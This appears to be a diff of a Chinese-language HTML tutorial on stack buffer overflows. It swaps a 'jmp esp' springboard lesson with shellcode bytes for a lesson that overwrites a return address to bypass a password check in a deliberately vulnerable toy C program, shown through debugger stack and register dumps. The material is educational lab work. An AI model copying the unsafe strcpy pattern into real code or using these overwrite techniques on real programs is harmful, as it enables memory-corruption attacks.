@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>3.1Use springboard</title>
+<title>2.3Redirect Program Execute Flow via Overrun Return Address</title>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <style type="text/css">
 /* GitHub stylesheet for MarkdownPad (http://markdownpad.com) */
@@ -468,16 +468,134 @@ vertical-align:1px;
 </style>
 </head>
 <body>
-<h1 id="use-springboard">Use springboard</h1>
-<p><strong>Author：wnagzihxain<br>Mail：tudouboom@163.com</strong></p>
+<h1 id="redirect-program-execute-flow-via-overrun-return-address">Redirect Program Execute Flow via Overrun Return Address</h1>
+<p><strong>Author：wnagzihxa1n<br>Mail：tudouboom@163.com<br>Site：www.wangzhixian.org<br>Create Time：2016.02.21
+</strong></p>
 <pre><code>#include &lt;stdio.h&gt;
-#include &lt;windows.h&gt;
+
 #define PASSWORD &quot;1234567&quot;
 
 int verify_password (char *password)
 {
     int authenticated;
-    char buffer[44];
+    char buffer[8];// add local buff
+    authenticated = strcmp(password, PASSWORD);
+    strcpy(buffer, password);//over flowed here!    
+    return authenticated;
+}
+
+int main(int argc, char **argv, char **envp)
+{
+    int valid_flag = 0;
+    char password[1024];
+    while(1)
+    {
+        printf(&quot;please input password:       &quot;);
+        scanf(&quot;%s&quot;, password);
+        valid_flag = verify_password(password);
+        if(valid_flag)
+        {
+            printf(&quot;incorrect password!\n\n&quot;);
+        }
+        else
+        {
+            printf(&quot;Congratulation! You have passed the verification!\n&quot;);
+            break;
+        }
+    }
+    system(&quot;pause&quot;);
+    return 0;
+}
+</code></pre><p>依照上次，在调用strcpy的时候下断点，注意栈里数据的变化</p>
+<p><img src="Image/1.png" alt=""></p>
+<pre><code>0012FB18   CCCCCCCC  烫烫
+0012FB1C   CCCCCCCC  烫烫
+0012FB20   00000001  ...
+0012FB24  /0012FF80  €.
+0012FB28  |004010EB  ?@.   返回到 stack_ov.004010EB 来自 stack_ov.00401005
+</code></pre><p>七个q已经赋值给字符串</p>
+<p><img src="Image/2.png" alt=""></p>
+<p>修改一下，在strcpy的下一句汇编代码下断点</p>
+<p>11个字符：&quot;abcdefjhijk&quot;</p>
+<p><img src="Image/3.png" alt=""></p>
+<p>观察栈里的变化，可以看到authenticated变量已经被覆盖掉了</p>
+<pre><code>0012FB14   CCCCCCCC  烫烫
+0012FB18   64636261  abcd
+0012FB1C   686A6665  efjh
+0012FB20   006B6A69  ijk.
+0012FB24  /0012FF80  € .
+0012FB28  |004010EB  ?@.   返回到 stack_ov.004010EB 来自 stack_ov.00401005
+0012FB2C  |0012FB7C  |?.   ASCII &quot;abcdefjhijk&quot;
+0012FB30  |0012B87C  |?.
+</code></pre><p>15个字符：&quot;abcdefjhijklmno&quot;</p>
+<p><img src="Image/4.png" alt=""></p>
+<p>覆盖掉了前栈帧的EBP</p>
+<pre><code>0012FB14   CCCCCCCC  烫烫
+0012FB18   64636261  abcd
+0012FB1C   686A6665  efjh
+0012FB20   6C6B6A69  ijkl
+0012FB24   006F6E6D  mno.
+0012FB28   004010EB  ?@.   返回到 stack_ov.004010EB 来自 stack_ov.00401005
+0012FB2C   0012FB7C  |?.   ASCII &quot;abcdefjhijklmno&quot;
+0012FB30   0012B74C  L?.
+</code></pre><p>19个字符：&quot;abcdefjhijklmnopqrs&quot;</p>
+<p><img src="Image/5.png" alt=""></p>
+<p>覆盖掉了返回地址</p>
+<pre><code>0012FB14   CCCCCCCC  烫烫
+0012FB18   64636261  abcd
+0012FB1C   686A6665  efjh
+0012FB20   6C6B6A69  ijkl
+0012FB24   706F6E6D  mnop
+0012FB28   00737271  qrs.
+0012FB2C   0012FB7C  |?.   ASCII &quot;abcdefjhijklmnopqrs&quot;
+0012FB30   0012B74C  L?.
+</code></pre><p>接着F8单步走，走到pop ebp的时候，注意寄存器窗口的变化，EBP已经被我们控制了</p>
+<p><img src="Image/6.png" alt=""></p>
+<p>此时寄存器的值</p>
+<pre><code>EAX 6C6B6A69
+ECX 0012FB90 ASCII CC,&quot;烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫&quot;
+EDX 00737271
+EBX 7FFDF000
+ESP 0012FB24 ASCII &quot;mnopqrs&quot;
+EBP 0012FB24 ASCII &quot;mnopqrs&quot;
+ESI 0012B77C
+EDI 0012FF80
+EIP 0040106E stack_ov.0040106E
+</code></pre><p>F8单步走，继续观察寄存器窗口的变化</p>
+<p><img src="Image/7.png" alt=""></p>
+<p>EBP已经变成了我们控制的值，然后注意EIP的值</p>
+<pre><code>EAX 6C6B6A69
+ECX 0012FB90 ASCII CC,&quot;烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫&quot;
+EDX 00737271
+EBX 7FFDF000
+ESP 0012FB28 ASCII &quot;qrs&quot;
+EBP 706F6E6D
+ESI 0012B77C
+EDI 0012FF80
+EIP 0040106F stack_ov.0040106F
+</code></pre><p>F8单步走下去</p>
+<p>跳到了不知道什么地方的地方</p>
+<p><img src="Image/8.png" alt=""></p>
+<p>看EIP寄存器，也变成了我们控制的值</p>
+<pre><code>EAX 6C6B6A69
+ECX 0012FB90 ASCII CC,&quot;烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫&quot;
+EDX 00737271
+EBX 7FFDF000
+ESP 0012FB2C
+EBP 706F6E6D
+ESI 0012B77C
+EDI 0012FF80
+EIP 00737271
+</code></pre><p>好了分析完了溢出后寄存器的变化以及程序运行过程，现在修改一下代码</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+
+#define PASSWORD &quot;1234567&quot;
+
+int verify_password (char *password)
+{
+    int authenticated;
+    char buffer[8];
     authenticated = strcmp(password, PASSWORD);
     strcpy(buffer, password);//over flowed here!    
     return authenticated;
@@ -485,10 +603,9 @@ int verify_password (char *password)
 
 int main()
 {
-    int valid_flag = 0;
+    int valid_flag=0;
     char password[1024];
     FILE * fp;
-    LoadLibrary(&quot;user32.dll&quot;);//prepare for messagebox
     if(!(fp = fopen(&quot;password.txt&quot;, &quot;rw+&quot;)))
     {
         exit(0);
@@ -507,60 +624,50 @@ int main()
     system(&quot;pause&quot;);
     return 0;
 }
-</code></pre><p>当输入11个<code>4321</code>，执行到retn的时候，可以看到ESP寄存器的值是<code>0x0012FB24</code></p>
-<p><img src="Image/1.png" alt=""></p>
-<p>现在我们把输入的数字变成14个<code>4321</code></p>
-<p>虽然程序跳到了不知道什么地方的地方，然而ESP寄存器的值依旧是<code>0x0012FB28</code></p>
-<p><img src="Image/2.png" alt=""></p>
-<p>寄存器的值，EBP被我们的数据覆盖掉了</p>
-<p><img src="Image/3.png" alt=""></p>
-<pre><code>EAX 31323334
-ECX 0012FBB4 ASCII CC,&quot;烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫&quot;
-EDX 00323334
-EBX 7FFDC000
-ESP 0012FB28
-EBP 31323334
-ESI 0012FB2C
-EDI 0012FF80
-EIP 00323334
-</code></pre><p>因为ESP寄存器在函数返回后不被溢出的数据干扰，看上面两次的测试就可以看出来，不管有没有溢出，函数返回后ESP寄存器的值都是<code>0x0012FB28</code></p>
-<p>这时候隆重来介绍一下<code>jmp esp</code>，简单来说呢，就是用这句汇编来覆盖返回地址，具体怎么做接下来慢慢讲</p>
-<p>首先用插件来搜索<code>jmp esp</code>，用现成的最好了，如果没有的去搜一下，<code>ollyuni.dll</code></p>
-<p>然后就可以用了</p>
-<p><img src="Image/4.png" alt=""></p>
-<p>搜一下<code>jmp esp</code>那个，当然中间会卡一下，卡完之后就可以点击<code>L</code>看信息了</p>
-<p><img src="Image/5.png" alt=""></p>
-<p>思来想去，决定选择<code>0x7FFA4512</code></p>
-<pre><code>0027762F   Location found: call esp in [unknown]
-00277A0D   Location found: call esp in [unknown]
-00277A17   Location found: call esp in [unknown]
-003010C8   Location found: call esp in [unknown]
-00305028   Location found: jmp esp in [unknown]
-00402166   Location found: jmp esp in stack_ov.text
-00429233   Location found: call esp in stack_ov.rdata
-7C8369C0   Location found: call esp in kernel32.text
-7C871613   Location found: call esp in kernel32.text
-7FFA4512   Location found: jmp esp in [unknown]
-7FFA54CD   Location found: jmp esp in [unknown]
-           11 addresses found, 0 filtered
-</code></pre><p>好了，有了这个之后就可以开始下面的工作了</p>
-<p>前面说到，程序在后面没有正常退出而是直接崩溃了，那么现在就来解决这个问题，方法也很简单，直接<code>exit</code>就好了</p>
-<p>同样利用Dependency Walker找到<code>kernel.dll</code>的基址和<code>ExitProcess</code>的偏移，然后找个计算器加起来</p>
-<pre><code>0x7C800000 + 0x0001D20A = 0x7C81D20A
-</code></pre><p><img src="Image/6.png" alt=""></p>
-<p>现在来准备password.txt</p>
-<p>我们大概的过程先是把buffer都给覆盖掉，然后返回地址覆盖上刚刚的<code>jmp esp</code>的内存地址，再往下就是shellcode</p>
-<p>行动！！！！！！</p>
-<p><img src="Image/7.png" alt=""></p>
-<p>其实呢，这个shellcode是有点问题的，为什么呢？</p>
-<p>这涉及到了截断的问题，B8 0A是一定会被截断的，所以……，往下看</p>
-<p>重新载入，运行起来</p>
-<p><img src="Image/8.png" alt=""></p>
-<p>的确是被截断了，后面那个00就是截断符，至于为什么后面再说，咱们这里先手动改一下</p>
-<pre><code>0012FB45    B8 0AD2817C     mov     eax,kernel32.ExitProcess
-0012FB4A    FFD0            call    eax
-</code></pre><p><img src="Image/9.png" alt=""></p>
-<p>然后继续运行，成功退出了：）</p>
+</code></pre><p>小改了下代码，然后在程序同文件夹下创建一个txt，写入&quot;1234567&quot;</p>
+<p>F8单步走下来，找到main函数入口，至于怎么找入口。。。。。。三个压栈操作下面就是了</p>
+<p><img src="Image/9.png" alt=""></p>
+<p>F7跟进去，这是main函数领空，F8继续单步，先找到verify_password ()的入口， F8运行，断在这</p>
+<p><img src="Image/10.png" alt=""></p>
+<p>同时拉下来看下面的汇编代码，找到密码验证成功的代码，地址是0040111F</p>
+<pre><code>0040110E  |. /74 0F         je short stack_ov.0040111F
+00401110  |. |68 70804200   push offset stack_ov.??_C@_0BF@IIFN@incorrect?5password?&gt;;  ASCII &quot;incorrect password!\n&quot;
+00401115  |. |E8 36040000   call stack_ov.printfgvdbgnnd_blockeressges
+0040111A  |. |83C4 04       add esp,0x4
+0040111D  |. |EB 0D         jmp short stack_ov.0040112C
+0040111F  |&gt; \68 30804200   push offset stack_ov.??_C@_0DD@FPBB@Congratulation?$CB?5&gt;
+;  ASCII &quot;Congratulation! You have passed the verification!\n&quot;
+00401124  |.  E8 27040000   call stack_ov.printfgvdbgnnd_blockeressges
+</code></pre><p>记下来，然后F7跟入verify_password ()，然后F8单步走到如下位置，观察栈以及寄存器的数据</p>
+<p><img src="Image/11.png" alt=""></p>
+<p>F8单步，在此处下断点，后面运行的时候需要用</p>
+<p><img src="Image/12.png" alt=""></p>
+<p>根据以前的分析，可以确定各变量在栈里所在位置</p>
+<pre><code>0012FB14   34333231  1234
+0012FB18   00373635  567.
+0012FB1C   00000000  ....
+0012FB20  /0012FF80  € .
+0012FB24  |00401104    @.  返回到 stack_ov.mainshort_argingAblock_pages+74 来自 stack_ov.00401005
+0012FB28  |0012FB7C  |?.   ASCII &quot;1234567&quot;
+0012FB2C  |0012B74C  L?.
+0012FB30  |0012B77C  |?.
+</code></pre><p>现在来构造数据，任意16进制编辑器都可以，因为刚刚找到了密码验证正确的跳转地址</p>
+<p>而且如果以“4321”为一组的话，覆盖返回地址刚好在第5组，返回地址在0040111F</p>
+<p>根据数据在内存里的排列顺序，输入要倒着来也就是1F 11 40 00</p>
+<p><img src="Image/13.png" alt=""></p>
+<p>运行，刚刚下的断点就是为了这里用的</p>
+<p><img src="Image/14.png" alt=""></p>
+<p>栈里的数据，可以看到成功的覆盖掉了</p>
+<pre><code>0012FB14   31323334  4321
+0012FB18   31323334  4321
+0012FB1C   31323334  4321
+0012FB20   31323334  4321
+0012FB24   0040111F  ¬ @.  stack_ov.0040111F
+0012FB28   0012FB7C  |?.
+0012FB2C   0012B74C  L?.
+0012FB30   0012B77C  |?.
+</code></pre><p>F9继续运行，成功跳到了密码验证正确的if分支，因为堆栈不平衡，所以程序崩溃了</p>
+<p><img src="Image/15.png" alt=""></p>
 
 </body>
 </html>
